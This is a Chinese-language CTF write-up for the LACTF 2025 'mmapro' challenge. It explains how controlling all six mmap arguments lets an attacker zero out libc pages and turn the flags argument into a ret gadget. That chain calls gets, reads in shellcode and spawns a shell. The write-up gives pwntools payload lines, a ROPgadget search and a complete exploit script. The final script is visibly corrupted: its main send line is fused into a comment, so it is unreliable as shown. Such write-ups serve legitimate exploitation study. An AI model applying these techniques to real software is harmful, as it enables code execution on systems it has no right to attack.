# 关于LACTF 2025 mmapro知识点思考-先知社区

> **来源**: https://xz.aliyun.com/news/17167  
> **文章ID**: 17167

---

# 前言

这个题的源代码十分的简短，但是需要对`mmap`的实现有一定的了解，通过这个复现随便来浅浅了解一下`mmap`函数

# 题目源码

```
#include <unistd.h>
#include <sys/mman.h>

int main()
{
    long a[6] = {mmap};
    write(1, a, 8);
    read(0, a, sizeof(a));
    mmap(a[0], a[1], a[2], a[3], a[4], a[5]);
}
```

程序一开始就给了我们`mmap`的地址，泄露了`libc`地址给我们

```
    write(1, a, 8);	
```

其次给我们可以控制`mmap`的六个参数

```
    read(0, a, sizeof(a));
    mmap(a[0], a[1], a[2], a[3], a[4], a[5]);
```

## 猜测

既然程序给了我们`libc`的地址，也给了我们控制`mmap`的参数，那么大概率是需要通过`mmap`来实现控制程序的执行流程

## `mmap`函数

Linux的`mmap`（内存映射）是一种将文件或设备直接映射到进程虚拟地址空间的机制，允许进程像访问内存一样操作文件或共享内存，函数原型

```
void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);
```

前面的三个参数都是老朋友，最主要的是后面的`flags`，通过查阅文档可以发现对`flags`的描述

|  |  |  |
| --- | --- | --- |
| flags宏 | 十六进制值 | 说明 |
| `MAP_SHARED` | `0x01` | 映射区域与其他进程共享，对内存的修改会同步到文件。 |
| `MAP_PRIVATE` | `0x02` | 映射区域为私有，写入时会触发“写时复制”（Copy-on-Write），不修改文件。 |
| `MAP_FIXED` | `0x10` | 强制使用指定的起始地址 `start`，若冲突则失败。 |
| `MAP_ANONYMOUS` | `0x20` | 匿名映射（不关联文件），通常与 `MAP_ANON` 等价。 |
| `MAP_DENYWRITE` | `0x0800` | 禁止对映射文件的其他直接写入操作（需文件未被其他进程打开写入）。 |
| `MAP_LOCKED` | `0x2000` | 锁定映射区域，防止被交换到磁盘（Swap）。 |

可以看到我们通过`MAP_ANONYMOUS`实现匿名映射，不与任何文件做关联，即可以不用管`fd`的值；而`MAP_FIXED`可以强制指定一个地址，作为开始，那么我们是否可以利用这个特性将`libc`的地址重新映射，所以我们先实践一下，是否可行 `MAP_ANONYMOUS`与`MAP_FIXED`或值刚好是`0x30`

```
p.send(p64((libc.address&-4096)) + p64(0x1000)+p64(0x7)+p64(0x30)+p64(0)+p64(0))
```

![image-20250307144022800.png](images/c811b2ea-7a4d-35d0-a8e6-0548fbbe8621)

但是经过实践发现不太行

![image-20250307144100513.png](images/3f87e492-3562-399d-bc44-e753fc3a8afb)

于是问了一下`deepseek`，发现还需要加这个`flags`，\*\*`MAP_PRIVATE` \*\*：通过写时复制实现内存修改的隔离，保护原始数据不被意外修改。

因为本质上我们`libc`也算是映射的一个文件的副本，若我们想要覆盖（通过`mmap`）它的话，必须是加上`MAP_PRIVATE` ，才可以

所以我们第二次尝试，这次加上`MAP_PRIVATE` 的`flags`

```
p.send(p64((libc.address&-4096)) + p64(0x1000)+p64(0x7)+p64(0x32)+p64(0)+p64(0))
```

![image-20250307145201576.png](images/32d31db1-c4a6-3148-be37-9df97271e852)

成功实现，但是我们发现这里`libc`的数据因为重新覆盖而变成了空数据，即是全部都是`00`字符

![image.png](images/dd9182af-03dc-329c-8d40-242b91c82fa6)

# 思路&利用方法

对于目前来说，我们可以实现的是将一段`libc`的内存，使之变为全是00的字符数据，那么我们使用在`mmap`函数所在的页看看会发生什么

```
p.send(p64((libc.sym['mmap']&-4096)) + p64(0x1000)+p64(0x7)+p64(0x32)+p64(0)+p64(0))
```

![image-20250307150511422.png](images/9b0f1fb5-356d-396c-bb0e-e97f5d5653d6)

我们继续步进看看会发生什么

![image-20250307150539514.png](images/cf5cf596-705a-3261-866c-1c48da818f4c)

这里可以发现`mmap`函数的数据全部是00字符，而这些00字符刚好组合成这个汇编代码

```
add    byte ptr [rax], al
```

而`mmap`的返回值刚好是我们一开始给它的`start`的地址，所以这里是一个合法地址，使得这个指令可以正常执行下去，形成了一个类似于`Nop`的滑板指令

我们继续执行就可以看到它会卡到我们没有修改的相邻页上的代码地址

![image.png](images/c17711fe-b4d8-3086-bc45-7c6630bb681d)

自此，如果在以页为开始的`libc`代码，即以`0x000`结尾的地址，并且是在`mmap`函数所在的页的下方，我们就可以使用它作为我们可用的`gadget`

下面是参考了官方`wp`

## 可用`gadget`

官方`exp`使用的是这个地址

```
mmap(libc.address+0x115000, 0x57000, 7, libc.address+0xbda72, libc.sym.gets, libc.address+0x115000)
```

我们可以计算一下也就是`0x115000+0x57000`就是`0x16c000`的位置，这里可以看看是怎么实现的，下面是以`mmap`所在的页为`start`地址

```
offset = 0x16c000 - (libc.sym['mmap']&-4096)
.....
p.send(p64((libc.sym['mmap']&-4096)) + p64(offset)+p64(0x7)+p64(0x32)+p64(2)+p64(0x1000))
```

![image-20250307152949971.png](images/35c2a9cb-084b-3ca4-a40a-b2598415f687)

可以发现是`ptsname_r`函数的开头位置，并且`call ioctl`并没有被我们所覆写，所以可以成功调用，也有把`canary`给压入栈中，最后

![image.png](images/f5e29879-9b0a-375c-9073-668333d89b5d)

这里可以发现卡在了0x32的位置上，如果我们仔细看的话就可以发现，这个0x32就是我们控制的`flags`数据，那么我们改如何利用这个呢

我们回想一下我们正常使用`mmap`的时候，我们是怎么用这个`flags`，例如

```
void *addr = mmap(NULL, size, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
```

不难发现是或运算，并且对应的`flags`也就是只用那么几个，那么我们可以找到一个符合条件的`ret`，即满足上面的`flags`的条件的，我们可以通过对应寻找一下

```
ROPgadget --binary libc.so.6 --opcode c3 | grep "032"
```

![image-20250307155612100.png](images/7e135bb5-ba2d-3265-8012-86ad89ca685e)

随便选条032为结尾即可

然后既然我们的`rdi`是我们的`start`地址，那么我们可以使用`gets`写入`shellcode`，然后再让程序跳转到位置即可

```
p.send(p64((libc.LIBC.sym['mmap']&-4096)) + p64(offset)+p64(0x7)+p64(gadget)+p64(libc.LIBC.sym['gets'])+p64((libc.LIBC.sym['mmap']&-4096)))
```

原理就是把flags设置为符合条件并且是ret指令的地址，然后把`fd`控制位`gets`函数，`offset`控制为`start`地址，这样就可以实现一个`ROP`链

最后

![image-20250307160130380.png](images/8e155fed-ebe0-34e9-a707-a4c73f4da7db)

## exp

完整`exp`如下

```
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
libc = ELF("./libc.so.6")

def get_p(name):
    global p,elf 
    p = process(name)
    #p = remote("")
    elf = ELF(name)

get_p("./mmapro")
offset = 0x115000 + 0x57000 - (libc.LIBC.sym['mmap']&-4096)
print(hex(offset))
libc.address = u64(p.recv(8)) - libc.sym['mmap']
gadget = 0x00000000000ae032 + libc.LIBC.address
print(hex(libc.address))
# gdb.attach(p,"")
# sleep(2)p64(offset)+p64(0x7)+p64(gadget)+p64(libc.sym['gets'])+p64((libc.sym['mmap']&-4096)))
sleep(0.2)
p.sendline(asm(shellcraft.sh()))
p.interactive()
```

## 最后

因为是按页覆盖，实际上利用的`gadget`并不是很多，笔者也是有尝试过通过爆破来实现定位到可用`gadget`的偏移，不需要很久的时间，可以利用`pwntools+gdb`来对最后卡住的寄存器进行判断，来实现可用`gadget`的爆破
